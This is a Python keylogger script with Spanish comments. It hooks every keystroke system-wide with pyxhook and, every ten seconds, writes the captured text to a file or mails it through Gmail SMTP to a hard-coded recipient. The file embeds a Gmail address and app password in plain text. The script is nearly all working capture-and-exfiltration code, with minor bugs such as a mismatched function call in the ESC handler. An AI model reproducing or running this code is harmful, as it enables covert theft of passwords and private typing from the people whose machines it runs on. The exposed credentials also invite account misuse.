import pyxhook #a mi no me funciono con ese porque mac
# pero si con este from pynput import keyboard
#entonces si cambia el codigo poquito
import threading
import smtplib
import time
import sys


# Cambia estos datos a los tuyos
userMail = "keyloggerp531@gmail.com"
userPass = "zdhr jzws jqiq zkqf"
userTo = "sirofatala@gmail.com"
mailSubject = "Registro de teclas"
logfile = "keyfile.txt"
wait_seconds = 10
guardar_txt = False
enviar_mail = False
keys = []
server = None


def oneKeyEvent(event):
    tecla = event.Key
    keys.append(tecla)
   
    if tecla == "esc":
        texto = formatear_tecla()
        if enviar_mail:
            enviar_email(texto)
        print("\n[!] Saliendo del programa.")
        sys.exit(0)

def callback():
    hm = pyxhook.HookManager()
    hm.KeyDown = oneKeyEvent
    hm.HookKeyboard()
    hm.start()





def formatear_tecla():
    data = "".join(keys)
    return data.replace("Space", " ")
    

def guardar_en_archivo():
    try:
        with open(logfile, "a") as f:
            contenido = formatear_tecla()
            f.write(contenido)
            print("Texto guardado en archivo.")
    except Exception as e:
        print("Error al guardar en archivo:", e)

def config_server(): 
    global server 
    
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(userMail, userPass)
    
def enviar_email():
    print("Entro a mail")
    
    try:        
        # server=smtplib.SMTP("smtp.gmail.com", 587)
        # server.ehlo()
        # server.starttls()
        # server.login(userMail, userPass)
       
        contenido = formatear_tecla()
        mensaje = f"Subject: {mailSubject}\n\n{contenido}"
        server.sendmail(userMail, [userTo], mensaje)
        print("Lo termino de mandar el mail")
        print("Correo enviado :)")
        
        
    except Exception as e:
        print("Error al enviar el correo :(")
        import traceback
        traceback.print_exc()

def revisar():
    global keys
    while True:
        time.sleep(wait_seconds)
        if keys:
            if enviar_mail:
                enviar_email()
                print("salgo de mandar mail")
            if guardar_txt:
                guardar_en_archivo()
                print("salgo de guardar")
            keys.clear()




def pregunta(prompt):
    while True:
        respuesta = input(prompt).strip().lower()
        if respuesta == "exit":
            print("Terminando ejecución")
            sys.exit(0)
        if respuesta in ("y"):
            return True
        elif respuesta in ("n"):
            return False
        else:
            print("Responde con 'y','n' o 'exit'")

if __name__ == "__main__":
    print("Para salir en cualquier pregunta escribe 'exit'.\n")

    enviar_mail = pregunta("¿Deseas enviar los registros por email? [y/n]: ")
    guardar_txt = pregunta("¿Deseas guardar los registros en texto plano? [y/n]: ")

    if not enviar_mail and not guardar_txt:
        print("No se seleccionó ninguna acción. El programa se cerrará.")
        sys.exit(0)
    
    if enviar_mail:
        print("config mail")
        config_server()
        print("listo congig serrver")

    print("\nIniciando.... Presiona ESC para salir.")
    t = threading.Thread(target=revisar, daemon=True)
    t.start()
    callback()